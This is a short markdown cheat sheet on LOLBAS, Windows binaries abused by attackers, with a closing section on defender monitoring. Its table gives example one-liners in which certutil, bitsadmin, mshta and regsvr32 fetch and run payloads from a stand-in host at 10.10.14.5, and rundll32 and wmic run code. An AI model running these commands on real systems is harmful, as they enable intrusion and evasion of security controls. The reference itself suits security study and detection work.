# LOLBAS (Windows)

- **What it is:** **Living Off the Land Binaries, Scripts and Libraries** — legitimate, signed Windows binaries that attackers abuse to download, execute, or bypass controls **without dropping new tools**. The Windows analogue of [GTFOBins](GTFOBins.md).
- **Site:** https://lolbas-project.github.io
- **Why it matters:** these binaries are already present and trusted, so they slip past application allow-listing and basic AV. Useful for execution, download, and defense evasion during post-exploitation.

## Representative examples
Confirm exact syntax on the LOLBAS site; abuse functions change across Windows versions.

| Binary | Abuse | Example |
| --- | --- | --- |
| `certutil.exe` | download a file | `certutil -urlcache -f http://10.10.14.5/x.exe x.exe` |
| `bitsadmin.exe` | download a file | `bitsadmin /transfer j http://10.10.14.5/x.exe C:\x.exe` |
| `mshta.exe` | run remote HTA/script | `mshta http://10.10.14.5/a.hta` |
| `regsvr32.exe` | run remote scriptlet | `regsvr32 /s /u /i:http://10.10.14.5/a.sct scrobj.dll` |
| `rundll32.exe` | execute a DLL/export | `rundll32 shell32.dll,Control_RunDLL evil.dll` |
| `wmic.exe` | process creation | `wmic process call create "cmd /c ..."` |
| `msbuild.exe` | compile+run inline C# | run a crafted `.csproj` (bypasses allow-listing) |

**Flag notes (certutil example):** `-urlcache` uses the URL cache transfer, `-f` forces re-download, the trailing name is the local output file.

## Defender view
- Application allow-listing alone is not enough — monitor **how** these binaries are used (network egress from `certutil`, `mshta` loading remote content).
- Enable and tune **Sysmon** (process creation, network, image load) and alert on known LOLBAS abuse patterns.
- Microsoft's **ASR rules** block several of these behaviours.
